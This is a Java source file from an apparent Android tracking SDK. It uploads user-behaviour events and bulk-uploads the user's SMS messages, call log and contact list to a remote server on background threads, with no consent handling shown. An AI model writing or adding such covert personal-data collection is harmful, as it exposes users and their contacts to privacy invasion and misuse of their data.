package com.xwjr.track;

import android.os.Build;
import android.util.Log;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class TrackOperate {

    //上传用户行为数据，data为List<Map<String,String>>的json字符串

    public static void upload(Map<String, String> data) {
        //开启线程来发起网络请求
        List<Map<String, String>> mapList = new ArrayList<>();
        mapList.add(data);
        upload(TrackData.mapList2String(mapList));
    }

    public static void upload(List<Map<String, String>> data) {
        try {
            //开启线程来发起网络请求
            if (data.size() <= TrackConfig.singleDataLimit) {
                upload(TrackData.mapList2String(data));
            } else {
                List<Map<String, String>> upData = new ArrayList<>();
                for (int i = 0; i < data.size(); i++) {
                    upData.add(data.get(i));
                    if (upData.size() >= TrackConfig.singleDataLimit) {
                        upload(TrackData.mapList2String(upData));
                        upData.clear();
                    }
                }
                upload(TrackData.mapList2String(upData));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public static void upload(final String data) {
        //开启线程来发起网络请求
        if (TrackConfig.debug) {
            LogUtils.i("上传的URL " + TrackConfig.trackUrl + TrackConfig.trackApphubkey);
            LogUtils.i("上传的json数据 " + data);
        }
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection connection = null;
                BufferedReader reader = null;
                try {
                    URL url = new URL(TrackConfig.trackUrl + TrackConfig.trackApphubkey);
                    connection = (HttpURLConnection) url.openConnection();
                    connection.setConnectTimeout(20000);
                    connection.setReadTimeout(20000);
                    connection.setRequestMethod("POST");
                    DataOutputStream out = new DataOutputStream(connection.getOutputStream());
                    out.write(("data=" + data).getBytes());
                    InputStream in = connection.getInputStream();
                    //下面对获取到的输入流进行读取
                    reader = new BufferedReader(new InputStreamReader(in));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }
                    if (TrackConfig.debug) {
                        LogUtils.i("上传返回数据 " + response.toString());
                    }

                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    if (reader != null) {
                        try {
                            reader.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                    if (connection != null) {
                        connection.disconnect();
                    }
                }
            }
        }).start();
    }

    //上传用户短信信息，mobile为当前登录用户的手机号
    public static void upLoadSMS(final String mobile) {
        try {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    upload(TrackData.mapList2String(TrackData.getSMSData(mobile)));
                }
            }).start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    //上传用户通话记录信息，mobile为当前登录用户的手机号
    public static void upLoadCall(final String mobile) {
        try {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    upload(TrackData.mapList2String(TrackData.getCallData(mobile)));
                }
            }).start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    //上传用户通话记录信息，mobile为当前登录用户的手机号
    public static void upLoadContract(final String mobile) {
        try {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    upload(TrackData.mapList2String(TrackData.getContactData(mobile)));
                }
            }).start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    //上传本地存储的数据
    public static void upLoadLocalData(final boolean clearData) {
        try {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    upload(TrackLocalData.getTrackData());
                    if (clearData) {
                        TrackLocalData.clearTrackData();
                    }
                }
            }).start();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void upLoadLocalData() {
        try {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    upload(TrackLocalData.getTrackData());
                    TrackLocalData.clearTrackData();
                }
            }).start();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void upLoadAllLocalData() {
        try {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    upload(TrackData.mapList2String(TrackLocalData.getTrackData()));
                    TrackLocalData.clearTrackData();
                }
            }).start();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }


}
